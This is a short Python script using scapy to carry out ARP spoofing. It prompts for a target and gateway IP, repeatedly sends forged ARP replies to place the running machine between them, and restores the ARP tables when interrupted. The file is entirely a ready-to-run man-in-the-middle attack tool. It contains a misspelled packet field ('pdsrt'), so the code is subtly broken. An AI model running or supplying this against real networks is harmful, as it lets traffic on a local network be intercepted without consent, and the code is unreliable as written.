import time
import scapy.all as scapy
from scapy.layers.l2 import ARP as ARP
from scapy.layers.l2 import Ether as Ether


def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    return answered_list[0][1].hwsrc


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = ARP(op=2, pdst=target_ip, pdsrt=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


target_ip = input("Enter the Target ip : ")
gateway_ip = input("Enter the Gateway ip : ")

sent_packet = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet += 2
        print("\r[+] Packets send = " + str(sent_packet), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nResetting changes..........")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
